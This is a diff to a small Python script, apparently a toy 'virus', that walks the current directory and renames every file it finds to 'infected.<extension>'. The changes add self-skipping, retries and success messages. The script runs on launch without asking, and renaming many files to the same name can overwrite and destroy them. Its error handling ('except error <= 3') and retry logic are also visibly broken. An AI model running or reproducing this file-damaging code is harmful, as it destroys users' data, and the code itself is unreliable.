@@ -6,7 +6,9 @@ def search(path="."):
 	for filename in os.listdir(path): # gets a list of file names in a given path
 		print (filename, end='')
 		if filename.startswith("infected"):
-			print (" infected")
+			print (" Infected")
+		elif filename == os.path.basename(__file__):
+			print (" Infected")
 		else:
 			print (" not infected yet... Infecting...")
 			normalFiles.add(filename)
@@ -20,12 +22,16 @@ def infect(filelist):
 		try:
 			os.rename(filename, "infected." + str(filename.split(".")[-1]))
 		except error <= 3:
-			print ("Infect failed... Trying again...")
+			print ("Infect failed... Trying again...\n")
+			time.sleep(2)
 			infect(search())
 			error += 1
+		finally:
+			print (filename + " Success Infected")
 
 filelist = search()
 
 print (filelist)
 
 infect(filelist)
+
